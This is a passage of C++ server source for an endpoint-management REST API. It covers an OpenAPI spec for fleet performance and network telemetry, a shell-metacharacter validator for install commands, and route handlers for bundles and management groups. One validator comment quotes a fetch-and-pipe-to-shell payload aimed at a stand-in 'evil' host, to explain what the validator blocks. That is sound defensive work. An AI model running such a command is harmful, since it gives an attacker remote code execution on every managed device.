or live query unavailable"}, "504": {"description": "device did not respond in time"}}}
    },
    "/dex/devices/{id}/app-perf": {
      "get": {"summary": "Per-device app performance over time (B1 drill)", "tags": ["DEX"], "description": "Requires GuaranteedState:Read, scoped to the device's management group. This device's retained daily per-app-version performance series from the Postgres B1 store — the 'over time, on THIS box' companion to the fleet trend GET /dex/perf/app. One row per (app, version, UTC day) over the B1 retention (up to 31 days): cpu_avg/cpu_max are share-of-capacity %, ws_avg_bytes/ws_max_bytes are working-set bytes, samples is the hourly-bucket count, instances_max the peak concurrent process count. No percentiles — a single device's daily averages ARE the series. Optional app query parameter narrows to one app name. Individual-identifying behavioral data, so every call emits a dex.device.app_perf.view audit event and FAILS CLOSED (503 + Sec-Audit-Failed: true) when that row cannot persist. Covers only resource-significant app-versions (procperf top-N), NOT every installed app.", "parameters": [{"name": "id", "in": "path", "required": true, "schema": {"type": "string"}}, {"name": "app", "in": "query", "required": false, "schema": {"type": "string"}, "description": "Exact app-name filter (optional)."}], "responses": {"200": {"description": "{data:{agent_id, app, rows[].{app_name, version, day, samples, instances_max, cpu_avg, cpu_max, ws_avg_bytes, ws_max_bytes}}}"}, "403": {"description": "outside the caller's management scope"}, "503": {"description": "Service unavailable, the app-perf store read degraded, OR the dex.device.app_perf.view audit row could not persist (carries Sec-Audit-Failed: true).", "headers": {"Sec-Audit-Failed": {"schema": {"type": "string", "enum": ["true"]}, "description": "Present when behavioural-PII was withheld because the access-audit row failed to persist."}}}}}
    },
    "/dex/perf/fleet": {
      "get": {"summary": "Fleet device-performance now-stats", "tags": ["DEX"], "description": "Requires GuaranteedState:Read. Current-cycle fleet stats (avg/p50/p90/max + n) for CPU utilization %, memory commit % and disk I/O latency ms, computed at request time over registry heartbeat state — the same numbers as the yuzu_fleet_perf_* Prometheus gauges and the /dex Performance tab. A metric nobody reported is null (absent, never 0); reporting and windows_online carry the honest denominators. Fleet aggregate — NOT audited.", "responses": {"200": {"description": "Fleet now object (cpu_pct|null, commit_pct|null, disk_lat_ms|null, reporting, windows_online)"}, "503": {"description": "service unavailable"}}}
    },
    "/dex/perf/cohorts": {
      "get": {"summary": "Fleet-relative performance percentiles per cohort", "tags": ["DEX"], "description": "Requires GuaranteedState:Read. Cohorts are the distinct values of an operator-chosen tag key (default model). Cohorts under the 10-device statistical floor return suppressed=true with their population and no stats; devices without the key form the explicit cohort=\"\" (untagged) residual, never a silent omission. available_keys lists the fleet's tag keys for picker UIs. Aggregate — NOT audited.", "parameters": [{"name": "key", "in": "query", "required": false, "schema": {"type": "string", "pattern": "^[A-Za-z0-9_.:-]{1,64}$", "default": "model"}}], "responses": {"200": {"description": "Cohort table (key, floor, cohorts[].{cohort, devices, suppressed, cpu_pct?, commit_pct?, disk_lat_ms?}, available_keys[])"}, "400": {"description": "Invalid tag key"}, "503": {"description": "service unavailable"}}}
    },
    "/dex/perf/cohort-diff": {
      "get": {"summary": "Direct cohort-vs-cohort performance comparison", "tags": ["DEX"], "description": "Requires GuaranteedState:Read. F2c (BRD 99/103): diffs two cohorts (values of the chosen tag key, default model) head-to-head — e.g. image_type vanilla vs layered — where /dex/perf/cohorts benchmarks each cohort against the fleet. Both cohort values a and b are required (an empty value is the untagged residual). delta_pct.<metric> is A's p50 relative to B's p50 (B the baseline), null unless BOTH cohorts expose the metric (neither suppressed below the 10-device floor). found_a/found_b are false when a cohort has no reporting devices. Aggregate — NOT audited.", "parameters": [{"name": "key", "in": "query", "required": false, "schema": {"type": "string", "pattern": "^[A-Za-z0-9_.:-]{1,64}$", "default": "model"}}, {"name": "a", "in": "query", "required": true, "schema": {"type": "string"}, "description": "First cohort value (empty string = untagged residual)."}, {"name": "b", "in": "query", "required": true, "schema": {"type": "string"}, "description": "Second cohort value (the baseline)."}], "responses": {"200": {"description": "Diff object (key, floor, found_a, found_b, a|null, b|null, delta_pct{cpu_pct|null, commit_pct|null, disk_lat_ms|null})"}, "400": {"description": "Invalid tag key, or missing cohort params"}, "503": {"description": "service unavailable"}}}
    },
    "/dex/perf/devices": {
      "get": {"summary": "Device list behind every fleet-performance drill", "tags": ["DEX"], "description": "Requires GuaranteedState:Read. Worst devices by a metric (default), devices NOT reporting perf this cycle (filter=not_reporting), or one cohort's members. The cohort key always resolves (default model) so rows carry real cohort values; filtering applies only when cohort_value is present (empty string = the untagged residual). fleet_pctile is the device's nearest-rank position among all reported values of the sort metric. Machine-health telemetry (device state, not behavioral data) — NOT audited; the behavioral DEX surfaces keep their audit verbs.", "parameters": [{"name": "metric", "in": "query", "required": false, "schema": {"type": "string", "enum": ["cpu", "commit", "disk_lat"], "default": "cpu"}}, {"name": "filter", "in": "query", "required": false, "schema": {"type": "string", "enum": ["not_reporting"]}}, {"name": "cohort_key", "in": "query", "required": false, "schema": {"type": "string", "pattern": "^[A-Za-z0-9_.:-]{1,64}$", "default": "model"}}, {"name": "cohort_value", "in": "query", "required": false, "schema": {"type": "string"}, "description": "When present, restrict to this cohort; empty string selects the untagged residual."}, {"name": "limit", "in": "query", "required": false, "schema": {"type": "integer", "default": 50, "maximum": 500}}], "responses": {"200": {"description": "Device rows (data[].agent_id, cohort, cpu_pct?, commit_pct?, disk_lat_ms?, fleet_pctile?)"}, "400": {"description": "Invalid cohort_key or limit"}, "503": {"description": "service unavailable"}}}
    },
    )json"
        // Split again (MSVC C2026 ~16 KB per-literal cap); concatenated at compile.
        // The DEX app-perf + network paths below start a fresh literal segment.
        R"json("/dex/perf/apps": {
      "get": {"summary": "Apps with retained fleet app-perf data (picker)", "tags": ["DEX"], "description": "Requires GuaranteedState:Read. Lists the distinct apps that currently have retained fleet performance-over-time data in the Postgres B2 store, so a worker discovers which app= values GET /dex/perf/app can answer (agentic-first A2 discovery). Each entry carries the count of distinct retained versions and the most recent UTC-midnight epoch day seen. truncated=true means the distinct-app list was clipped at the server cap (5000). Fleet metadata — NOT audited.", "responses": {"200": {"description": "Picker object (apps[].{app_name, versions, last_day}, truncated)"}, "503": {"description": "service unavailable, or the app-perf store read degraded (retry)"}}}
    },
    "/dex/perf/app": {
      "get": {"summary": "Fleet performance-over-time trend for one app", "tags": ["DEX"], "description": "Requires GuaranteedState:Read. The 'over time' companion to /dex/perf/fleet: reads the retained Postgres B1/B2 substrate (NOT live heartbeat) to answer 'did this app regress across the fleet'. Returns one point per (version, UTC day) over the B2 retention (up to 180 days). version omitted = every version interleaved, each point tagged with its canonicalized version; a supplied version is canonicalized to match the stored key. Each point carries the EXACT fleet mean and max (cpu_mean share-of-capacity %, ws_mean working-set bytes) plus bucket-resolution p50/p95 read from the fixed histogram. A percentile is {value, lower_bound}: lower_bound=true means it falls in the open top bucket and value is a FLOOR (render '>= value'), and a percentile is null when the population is empty or the row predates the current histogram scheme. hist_stale=true flags a point whose stored histogram scheme differs from the running one — its means/maxima still stand, its percentiles are withheld. Fleet aggregate (no agent_id) — NOT audited; the per-device drill lives on the audited /dex/devices/{id} family.", "parameters": [{"name": "app", "in": "query", "required": true, "schema": {"type": "string", "maxLength": 512}, "description": "App name; discover valid names via GET /dex/perf/apps."}, {"name": "version", "in": "query", "required": false, "schema": {"type": "string", "maxLength": 512}, "description": "Canonicalized and matched exactly; omit for all versions."}], "responses": {"200": {"description": "Trend object (app, version, points[].{version, day, device_count, suppressed, and when not suppressed: cpu_mean, cpu_max, cpu_p50|null, cpu_p95|null, ws_mean, ws_max, ws_p50|null, ws_p95|null, hist_stale}). A sub-floor (<10 devices) point carries suppressed=true with device_count only."}, "400": {"description": "missing app, or app/version invalid (too long or control characters)"}, "503": {"description": "service unavailable, or the app-perf store read degraded (retry)"}}}
    },
    "/dex/perf/group": {
      "get": {"summary": "Management-group app performance over time", "tags": ["DEX"], "description": "Requires GuaranteedState:Read. The fleet-trend shape (GET /dex/perf/app) aggregated over ONE management group's members, computed on-the-fly from the per-device B1 store (NOT the fleet B2). One point per (version, UTC day): exact group mean/max + bucket-resolution p50/p95, same histogram scheme as the fleet trend. Because a management group is a set of SPECIFIC devices, any (version, day) point covering fewer than the statistical floor (10) of devices is returned with suppressed=true and device_count only — its means/percentiles are withheld (a small named-group aggregate is de-facto individual behaviour). Aggregate (no agent_id) — NOT audited. Gated on GLOBAL GuaranteedState:Read (like the cohort surface): a management-group-scoped principal does not pass the global check and cannot use this endpoint, so the only callers who reach it already have unscoped fleet-wide read — no cross-operator exposure. Scoped operators are excluded by design, not by an unfinished control.", "parameters": [{"name": "group_id", "in": "query", "required": true, "schema": {"type": "string", "maxLength": 512}}, {"name": "app", "in": "query", "required": true, "schema": {"type": "string", "maxLength": 512}, "description": "App name; discover via GET /dex/perf/apps."}, {"name": "version", "in": "query", "required": false, "schema": {"type": "string", "maxLength": 512}, "description": "Canonicalized + matched exactly; omit for all versions."}], "responses": {"200": {"description": "Group trend (group_id, app, version, floor, points[].{version, day, device_count, suppressed, and when not suppressed: cpu_mean, cpu_max, cpu_p50|null, cpu_p95|null, ws_mean, ws_max, ws_p50|null, ws_p95|null, hist_stale})"}, "400": {"description": "missing group_id/app, or a param too long"}, "503": {"description": "service unavailable, or the app-perf group read degraded (retry)"}}}
    },
    "/network/fleet": {
      "get": {"summary": "Fleet network quality now-stats", "tags": ["Network"], "description": "Requires GuaranteedState:Read. Current-cycle fleet stats (avg/p50/p90/max + n) for smoothed RTT ms, the interval TCP retransmit rate % and device throughput bps, computed at request time over registry heartbeat NETWORK facts — OS-blended across the fleet (the per-OS yuzu_fleet_net_* Prometheus gauges split the same facts by os, so a gauge series differs from this blended number on a mixed fleet; the /network Overview cards show this same blended view). A metric nobody reported is null (absent, never 0); reporting, rtt_reporting (the honest RTT denominator) and online carry the populations. cooccurrence counts net-degraded devices that also show device-perf pressure / app instability (measured co-occurrence, never a cause). Device-aggregate link health — NOT audited.", "responses": {"200": {"description": "Fleet now object (rtt_ms|null, retrans_pct|null, throughput_bps|null, reporting, rtt_reporting, online, cooccurrence{degraded, also_device, also_app, network_only})"}, "503": {"description": "service unavailable"}}}
    },
    "/network/devices": {
      "get": {"summary": "Device list behind every network-quality drill", "tags": ["Network"], "description": "Requires GuaranteedState:Read. Worst devices by a metric (default rtt), devices NOT reporting network this cycle (filter=not_reporting), a co-occurrence band (cooc=device|app|network_only|degraded), or one cohort's members. Cohort handling mirrors the /network dashboard fragment: the optional key selects a tag dimension and cohort_value (empty string = the untagged residual) filters to it. Rows carry the co-occurring facts (under_pressure, app_unstable) and fleet_pctile (nearest-rank position for the sort metric) — evidence for correlation, never a verdict. Device-aggregate link health — NOT audited.", "parameters": [{"name": "metric", "in": "query", "required": false, "schema": {"type": "string", "enum": ["rtt", "retrans", "throughput"], "default": "rtt"}}, {"name": "filter", "in": "query", "required": false, "schema": {"type": "string", "enum": ["not_reporting"]}}, {"name": "cooc", "in": "query", "required": false, "schema": {"type": "string", "enum": ["device", "app", "network_only", "degraded"]}}, {"name": "key", "in": "query", "required": false, "schema": {"type": "string"}, "description": "Cohort tag key to resolve per-device cohort values; empty = no cohort dimension. NOTE: the network surface uses 'key' (with a length guard, empty allowed) where /dex/perf uses 'cohort_key' (validated, default 'model') — the difference mirrors each surface's cohort-resolution model."}, {"name": "cohort_value", "in": "query", "required": false, "schema": {"type": "string"}, "description": "When present, restrict to this cohort; empty string selects the untagged residual."}, {"name": "limit", "in": "query", "required": false, "schema": {"type": "integer", "default": 50, "maximum": 500}}], "responses": {"200": {"description": "Device rows (data[].agent_id, platform, cohort, rtt_ms?, retrans_pct?, throughput_bps?, net_degraded, under_pressure, app_unstable, fleet_pctile?)"}, "400": {"description": "Invalid limit"}, "503": {"description": "service unavailable"}}}
    }
  }
})json";
    return spec;
}

// ── Install-command input validation (#771 / W7.5 PR 1) ──────────────────────
//
// `verify_command`, `rollback_command`, and `silent_args` on a SoftwarePackage
// are persisted in `software_packages.*` and (per the cluster-2 follow-up
// roadmap) will be dispatched to enrolled agents once the deployment-execution
// path is wired up. To prevent a Write-permission operator from staging a
// fleet-RCE payload via shell injection (e.g. `"curl http://evil/sh | bash"`),
// reject any string that contains shell-meta characters at REST input time.
//
// Allowed characters cover the realistic install vocabulary across Windows /
// Linux / macOS installers (msiexec, reg, wmic, dpkg, rpm, pkg, PowerShell
// single-line invocations, /qn /norestart-style silent args). The block-list
// targets:
//   - command chaining: ; & |
//   - substitution: ` $
//   - redirection: < >
//   - subshells: ( )
//   - all C0 control characters except SPACE (covers \n \r \0 \t VT FF etc.)
//   - DEL (0x7F)
//
// Why not block braces / brackets / globs? Brace expansion is shell-side only
// — agents executing via `safe_execute` (CreateProcessW / fork+execvp) do not
// interpret braces. msiexec product GUIDs need them (`msiexec /x {GUID} /qn`).
// Length cap is 512 chars — generous for any realistic installer invocation.
//
// UTF-8 invariance: all blocked characters are ASCII. UTF-8 continuation
// bytes are 0x80–0xBF, never collide with our ASCII block-list, so a
// byte-wise scan on a UTF-8 std::string_view is correct without codepoint
// decoding. Do NOT "fix" the byte scan by adding decoding — it would not be
// safer and would slow the hot path.
//
// This is **defence-in-depth**: it caps the harm if/when an operator (or a
// future code path) ends up dispatching the field through a shell. The
// architectural follow-up (PR 2 of the W7.5 ladder) replaces the free-form
// string with a structured-action protocol via InstructionDefinition
// reference, which bypasses the shell entirely. PR 2 also needs to reconcile
// this validator's accepted alphabet ({ } [ ] etc.) against the agent-side
// `is_safe_arg` in content_dist_plugin.cpp, which currently has a stricter
// block list — divergence noted by Round 1 consistency review.
constexpr std::size_t kMaxInstallCommandLen = 512;

bool is_safe_install_command(std::string_view s) {
    if (s.size() > kMaxInstallCommandLen)
        return false;
    for (char c : s) {
        const auto uc = static_cast<unsigned char>(c);
        // Block ALL C0 control characters except SPACE (covers \0 \t \n \r
        // VT FF and the rest). Catches log-injection via VT (0x0B) etc. that
        // a journald collector might normalise to \n.
        if (uc < 0x20 && c != ' ')
            return false;
        // Block DEL (0x7F).
        if (uc == 0x7F)
            return false;
        switch (c) {
        // Command chaining / control flow
        case ';':
        case '&':
        case '|':
        // Substitution
        case '`':
        case '$':
        // Redirection
        case '<':
        case '>':
        // Subshell
        case '(':
        case ')':
            return false;
        default:
            break;
        }
    }
    return true;
}

} // anonymous namespace

namespace detail {

// W5.1 — definitions for the agentic JSON SSE shape contract. Declared
// in `rest_a4_envelope.hpp`; defined here so they retain access to the
// anonymous-namespace JObj/JArr builders (any move into a separate TU
// would either duplicate the builders or promote them to a public
// header — both bigger diffs than this PR warrants).

std::string make_correlation_id() {
    static std::atomic<std::uint64_t> seq{0};
    auto n = seq.fetch_add(1, std::memory_order_relaxed);
    auto t = std::chrono::duration_cast<std::chrono::milliseconds>(
                 std::chrono::system_clock::now().time_since_epoch())
                 .count();
    // std::format keeps the buffer-size reasoning out of the call site;
    // the surrounding file already uses std::format for the JObj double
    // path. governance round cpp-expert L-1.
    return std::format("req-{:x}-{:x}", static_cast<std::uint64_t>(t), n);
}

std::string error_json_a4(int code, std::string_view message, std::string_view correlation_id,
                          std::string_view remediation) {
    // A4 (docs/agentic-first-principle.md) lists retry_after_ms as a REQUIRED,
    // nullable envelope field. This no-retry overload emits it as null so every
    // REST A4 error body carries the full field set (matching the MCP a4_data
    // sibling); the second overload below supplies a concrete value. #1470.
    auto err = JObj()
                   .add("code", code)
                   .add("message", message)
                   .add("correlation_id", correlation_id)
                   .raw("retry_after_ms", "null");
    if (!remediation.empty()) {
        err.add("remediation", remediation);
    }
    return JObj().raw("error", err.str()).raw("meta", R"({"api_version":"v1"})").str();
}

std::string error_json_a4(int code, std::string_view message, std::string_view correlation_id,
                          std::int64_t retry_after_ms, std::string_view remediation) {
    auto err = JObj()
                   .add("code", code)
                   .add("message", message)
                   .add("correlation_id", correlation_id)
                   .add("retry_after_ms", retry_after_ms);
    if (!remediation.empty()) {
        err.add("remediation", remediation);
    }
    return JObj().raw("error", err.str()).raw("meta", R"({"api_version":"v1"})").str();
}

/// Payload size cap on `ev.data` before raw-embed into the envelope.
/// Agent-sourced fields (`AgentExecStatus::error_detail` populated
/// from agent reports) currently have no upstream cap, and every event
/// fan-outs to N subscribers — each subscriber pays the
/// `nlohmann::json::accept` parse cost on every envelope construction,
/// so an oversized payload amplifies linearly with subscriber count.
/// 64 KiB is well above any realistic ExecutionTracker payload
/// (typical < 1 KiB) and below the threshold where validation cost
/// becomes noticeable. governance R2 fix for unhappy-NEW-6 MED.
inline constexpr std::size_t kEventPayloadSizeCap = 64 * 1024;

std::string make_event_envelope(std::string_view execution_id,
                                const yuzu::server::ExecutionEvent& ev) {
    // Defensive validation — the contract is that publishers (the
    // ExecutionTracker mutators per ladder doc §"Publisher invariant")
    // emit well-formed JSON in `ev.data`. If a future publisher ever
    // shoves a non-JSON payload (e.g. a partial chunk after a kill-9),
    // raw-embedding it would silently produce a malformed envelope.
    // Also cap payload size — an unbounded agent-sourced field would
    // amplify per-subscriber parse cost (R2 unhappy NEW-6). On either
    // failure substitute `null` so the envelope stays a valid JSON
    // object and the agentic worker sees a non-fatal event with
    // payload=null rather than a protocol-level crash. The size check
    // runs first so we never feed a 10 MB blob to the validator.
    const bool payload_ok = !ev.data.empty() && ev.data.size() <= kEventPayloadSizeCap &&
                            nlohmann::json::accept(ev.data);
    const std::string_view payload =
        payload_ok ? std::string_view(ev.data) : std::string_view("null");
    return JObj()
        .add("execution_id", execution_id)
        .add("event_id", static_cast<int64_t>(ev.id))
        .add("timestamp_ms", ev.timestamp_ms)
        .add("type", ev.event_type)
        .raw("payload", payload)
        .str();
}

// --- /api/v1/dex/devices/{id}/live tuning (test seam; see rest_api_v1.hpp) ---
// Meyers-singleton atomics: production reads the defaults; unit tests lower them to
// exercise the 429 (cap) and 504 (timeout) branches deterministically.
std::atomic<int>& live_max_inflight() {
    static std::atomic<int> v{4};
    return v;
}
std::atomic<int>& live_poll_max_polls() {
    static std::atomic<int> v{40};
    return v;
}
std::atomic<int>& live_poll_interval_ms() {
    static std::atomic<int> v{500};
    return v;
}

} // namespace detail

// ── Route registration ───────────────────────────────────────────────────────

// Production overload — wraps httplib::Server in an HttplibRouteSink and
// delegates to the sink-based implementation below. Tests bypass this and
// call the sink overload directly with their own TestRouteSink (#438).
void RestApiV1::register_routes(
    httplib::Server& svr, AuthFn auth_fn, PermFn perm_fn, AuditFn audit_fn, RbacStore* rbac_store,
    ManagementGroupStore* mgmt_store, ApiTokenStore* token_store, QuarantineStore* quarantine_store,
    ResponseStore* response_store, InstructionStore* instruction_store,
    ExecutionTracker* execution_tracker, ScheduleEngine* schedule_engine,
    ApprovalManager* approval_manager, TagStore* tag_store, AuditStore* audit_store,
    ServiceGroupFn service_group_fn, TagPushFn tag_push_fn, InventoryStore* inventory_store,
    ProductPackStore* product_pack_store, SoftwareDeploymentStore* sw_deploy_store,
    DeviceTokenStore* device_token_store, LicenseStore* license_store,
    GuaranteedStateStore* guaranteed_state_store, yuzu::MetricsRegistry* metrics_registry,
    SessionRevokeFn session_revoke_fn, ExecutionEventBus* execution_event_bus,
    ResultSetStore* result_set_store, CommandDispatchFn command_dispatch_fn, StepUpFn step_up_fn,
    GuardianPushFn guardian_push_fn, DexPerfFn dex_perf_fn, NetPerfFn net_perf_fn,
    LockoutClearFn lockout_clear_fn, BaselineStore* baseline_store, ScopedPermFn scoped_perm_fn,
    SoftwareInventoryStore* software_inventory_store, InventoryScopeFn inventory_scope_fn,
    ResponseScopeFn response_scope_fn, AppPerfProviders app_perf_providers) {
    HttplibRouteSink sink(svr);
    register_routes(sink, std::move(auth_fn), std::move(perm_fn), std::move(audit_fn), rbac_store,
                    mgmt_store, token_store, quarantine_store, response_store, instruction_store,
                    execution_tracker, schedule_engine, approval_manager, tag_store, audit_store,
                    std::move(service_group_fn), std::move(tag_push_fn), inventory_store,
                    product_pack_store, sw_deploy_store, device_token_store, license_store,
                    guaranteed_state_store, metrics_registry, std::move(session_revoke_fn),
                    execution_event_bus, result_set_store, std::move(command_dispatch_fn),
                    std::move(step_up_fn), std::move(guardian_push_fn), std::move(dex_perf_fn),
                    std::move(net_perf_fn), std::move(lockout_clear_fn), baseline_store,
                    std::move(scoped_perm_fn), software_inventory_store,
                    std::move(inventory_scope_fn), std::move(response_scope_fn),
                    std::move(app_perf_providers));
}

void RestApiV1::register_routes(
    HttpRouteSink& sink, AuthFn auth_fn, PermFn perm_fn, AuditFn audit_fn, RbacStore* rbac_store,
    ManagementGroupStore* mgmt_store, ApiTokenStore* token_store, QuarantineStore* quarantine_store,
    ResponseStore* response_store, InstructionStore* instruction_store,
    ExecutionTracker* execution_tracker, ScheduleEngine* schedule_engine,
    ApprovalManager* approval_manager, TagStore* tag_store, AuditStore* audit_store,
    ServiceGroupFn service_group_fn, TagPushFn tag_push_fn, InventoryStore* inventory_store,
    ProductPackStore* product_pack_store, SoftwareDeploymentStore* sw_deploy_store,
    DeviceTokenStore* device_token_store, LicenseStore* license_store,
    GuaranteedStateStore* guaranteed_state_store, yuzu::MetricsRegistry* metrics_registry,
    SessionRevokeFn session_revoke_fn, ExecutionEventBus* execution_event_bus,
    ResultSetStore* result_set_store, CommandDispatchFn command_dispatch_fn, StepUpFn step_up_fn,
    GuardianPushFn guardian_push_fn, DexPerfFn dex_perf_fn, NetPerfFn net_perf_fn,
    LockoutClearFn lockout_clear_fn, BaselineStore* baseline_store, ScopedPermFn scoped_perm_fn,
    SoftwareInventoryStore* software_inventory_store, InventoryScopeFn inventory_scope_fn,
    ResponseScopeFn response_scope_fn, AppPerfProviders app_perf_providers) {

    spdlog::info("REST API v1: registering routes");

    // ── CORS preflight handler for /api/v1/* ─────────────────────────────
    // Actual CORS headers are added by the post-routing handler in server.cpp
    // with origin allowlist validation.
    sink.Options(R"(/api/v1/.*)",
                 [](const httplib::Request&, httplib::Response& res) { res.status = 204; });

    // ── OpenAPI spec endpoint (/api/v1/openapi.json) ─────────────────────
    sink.Get("/api/v1/openapi.json", [](const httplib::Request&, httplib::Response& res) {
        res.set_content(openapi_spec(), "application/json");
    });

    // ── /api/v1/me ───────────────────────────────────────────────────────

    sink.Get("/api/v1/me", [auth_fn, rbac_store](const httplib::Request& req,
                                                 httplib::Response& res) {
        auto session = auth_fn(req, res);
        if (!session)
            return;

        JObj data;
        data.add("username", session->username).add("role", auth::role_to_string(session->role));

        if (rbac_store && rbac_store->is_rbac_enabled()) {
            data.add("rbac_enabled", true);
            auto roles = rbac_store->get_principal_roles("user", session->username);
            if (!roles.empty()) {
                data.add("rbac_role", roles[0].role_name);
            } else {
                data.add("rbac_role",
                         session->role == auth::Role::admin ? "Administrator" : "Viewer");
            }
        } else {
            data.add("rbac_enabled", false);
            data.add("rbac_role", session->role == auth::Role::admin ? "Administrator" : "Viewer");
        }
        res.set_content(ok_json(data.str()), "application/json");
    });

    // ── Live-query bundle (/api/v1/bundles) — ADR-0011 ───────────────────
    // One instruction → several plugin actions on ONE device → collated
    // results, via server-side async fan-out. The agent is unchanged (it only
    // sees ordinary commands). The same BundleOrchestrator backs the MCP tools
    // (slice 3) — REST/MCP parity by construction. v1 manifest is in-memory;
    // migrating it to a durable Postgres store is a committed follow-up for HA +
    // assurance (ADR-0011 "Future — durable manifest in Postgres").
    std::shared_ptr<BundleOrchestrator> bundle_orch;
    if (command_dispatch_fn && response_store) {
        bundle_orch = std::make_shared<BundleOrchestrator>(
            command_dispatch_fn, response_store,
            [] {
                std::random_device rd;
                const std::uint64_t r = (static_cast<std::uint64_t>(rd()) << 32) ^ rd();
                char buf[17];
                std::snprintf(buf, sizeof(buf), "%016llx", static_cast<unsigned long long>(r));
                return std::string(buf);
            },
            metrics_registry, /*surface=*/"rest");
    }

    // POST /api/v1/bundles — dispatch (async). Returns the correlation id; poll
    // GET /api/v1/bundles/{id} for the collated result.
    sink.Post("/api/v1/bundles",
              [auth_fn, perm_fn, audit_fn, bundle_orch](const httplib::Request& req,
                                                        httplib::Response& res) {
                  if (!perm_fn(req, res, "Execution", "Execute"))
                      return;
                  if (!bundle_orch) {
                      res.status = 503;
                      res.set_content(error_json("service unavailable", 503), "application/json");
                      return;
                  }
                  auto body = nlohmann::json::parse(req.body, nullptr, false);
                  if (body.is_discarded()) {
                      res.status = 400;
                      res.set_content(error_json("invalid JSON"), "application/json");
                      return;
                  }
                  if (!body.contains("agent_id") || !body["agent_id"].is_string() ||
                      body["agent_id"].get<std::string>().empty()) {
                      res.status = 400;
                      res.set_content(
                          error_json("agent_id (non-empty string) is required — a bundle "
                                     "targets one device"),
                          "application/json");
                      return;
                  }
                  if (!body.contains("steps")) {
                      res.status = 400;
                      res.set_content(error_json("steps is required"), "application/json");
                      return;
                  }
                  auto specs = validate_bundle_steps(body["steps"].dump());
                  if (!specs) {
                      res.status = 400;
                      res.set_content(error_json("steps: " + specs.error()), "application/json");
                      return;
                  }
                  auto session = auth_fn(req, res);
                  const std::string principal = session ? session->username : std::string{};
                  // A bundle is owned by its dispatcher (collate gates on it). An
                  // empty principal would be un-attributable and collatable by any
                  // other empty-principal caller — refuse it, matching the
                  // self-target/empty-principal guard used elsewhere in this file
                  // (governance sec-M2 / comp-S1).
                  if (principal.empty()) {
                      res.status = 500;
                      res.set_content(error_json("authenticated session has no principal", 500),
                                      "application/json");
                      return;
                  }
                  const std::string agent_id = body["agent_id"].get<std::string>();
                  // Per-step audit bound to this request; the orchestrator stays req-free.
                  auto audit = [&audit_fn, &req](const std::string& verb, const std::string& result,
                                                 const std::string& type, const std::string& id,
                                                 const std::string& detail) {
                      audit_fn(req, verb, result, type, id, detail);
                  };
                  // dispatch fans N gRPC writes; a throw must not leave a
                  // half-written 202 — audit the failure and return 503 (parity
                  // with the MCP wrapper; governance UP-1 / sec-M1 / comp-S2).
                  BundleOrchestrator::DispatchResult r;
                  try {
                      r = bundle_orch->dispatch(agent_id, *specs, principal, audit);
                  } catch (const std::exception& e) {
                      audit_fn(req, "bundle.dispatch", "failure", "Execution", "",
                               std::string("agent=") + agent_id + " error=" + e.what());
                      res.status = 503;
                      res.set_content(error_json("bundle dispatch failed", 503), "application/json");
                      return;
                  }
                  audit_fn(req, "bundle.dispatch", "success", "Execution", r.correlation_id,
                           "agent=" + agent_id + " steps=" + std::to_string(r.expected));
                  res.status = 202; // accepted — collect via GET /api/v1/bundles/{id}
                  res.set_content(ok_json(JObj()
                                              .add("bundle_id", r.correlation_id)
                                              .add("agent_id", agent_id)
                                              .add("expected", static_cast<int64_t>(r.expected))
                                              .str()),
                                  "application/json");
              });

    // GET /api/v1/bundles/{id} — collate (poll). Server-grouped result.
    sink.Get(R"(/api/v1/bundles/(bundle-[a-f0-9]+))",
             [auth_fn, perm_fn, audit_fn, bundle_orch](const httplib::Request& req,
                                                       httplib::Response& res) {
                 if (!perm_fn(req, res, "Response", "Read"))
                     return;
                 if (!bundle_orch) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }
                 auto session = auth_fn(req, res);
                 const std::string principal = session ? session->username : std::string{};
                 const bool is_admin =
                     session && auth::effective_role(*session) == auth::Role::admin; // JIT elevation
                 const auto id = req.matches[1].str();
                 auto agg = bundle_orch->collate(id, principal, is_admin);
                 if (!agg) {
                     // not-found and not-owned return the same 404 so existence
                     // isn't an enumeration oracle; the real reason is audited.
                     audit_fn(req, "bundle.collate", "denied", "Execution", id,
                              "not found or not owned");
                     res.status = 404;
                     res.set_content(error_json("bundle not found"), "application/json");
                     return;
                 }
                 audit_fn(req, "bundle.collate", "success", "Execution", id,
                          std::string("complete=") + (agg->complete ? "1" : "0"));
                 res.set_content(ok_json(aggregate_to_json(*agg)), "application/json");
             });

    // ── Management Groups (/api/v1/management-groups) ────────────────────

    sink.Get("/api/v1/management-groups",
             [auth_fn, perm_fn, mgmt_store](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "ManagementGroup", "Read"))
                     return;
                 if (!mgmt_store) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }

                 auto groups = mgmt_store->list_groups();
                 JArr arr;
                 for (const auto& g : groups) {
                     arr.add(JObj()
                                 .add("id", g.id)
                                 .add("name", g.name)
                                 .add("description", g.description)
                                 .add("parent_id", g.parent_id)
                                 .add("membership_type", g.membership_type)
                                 .add("scope_expression", g.scope_expression)
                                 .add("created_by", g.created_by)
                                 .add("created_at", g.created_at)
                                 .add("updated_at", g.updated_at));
                 }
                 res.set_content(list_json(arr.str(), static_cast<int64_t>(groups.size())),
                                 "application/json");
             });

    sink.Post("/api/v1/management-groups", [auth_fn, perm_fn, audit_fn,
                                            mgmt_store](const httplib::Request& req,
                                                        httplib::Response& res) {
        if (!perm_fn(req, res, "ManagementGroup", "Write"))
            return;
        if (!mgmt_store) {
            res.status = 503;
            res.set_content(error_json("service unavailable", 503), "application/json");
            return;
        }

        auto body = nlohmann::json::parse(req.body, nullptr, false);
        if (body.is_discarded()) {
            res.status = 400;
            res.set_content(error_json("invalid JSON"), "application/json");
            return;
        }

        ManagementGroup g;
        g.name = body.value("name", "");
        g.description = body.value("description", "");
        g.parent_id = body.value("parent_id", "");
        g.membership_type = body.value("membership_type", "static");
        g.scope_expression = body.value("scope_expression", "");

        auto session = auth_fn(req, res);
        if (session)
            g.created_by = session->username;

        auto result = mgmt_store->create_group(g);
        if (!result) {
            res.status = 400;
            res.set_content(error_json(result.error()), "application/json");
            return;
        }
        audit_fn(req, "management_group.create", "success", "ManagementGroup", *result, g.name);
        res.status = 201;
        res.set_content(ok_json(JObj().add("id", *result).str()), "application/json");
    });

    sink.Get(R"(/api/v1/management-groups/([a-f0-9]+))",
             [auth_fn, perm_fn, mgmt_store](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "ManagementGroup", "Read"))
                     return;
                 if (!mgmt_store) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }

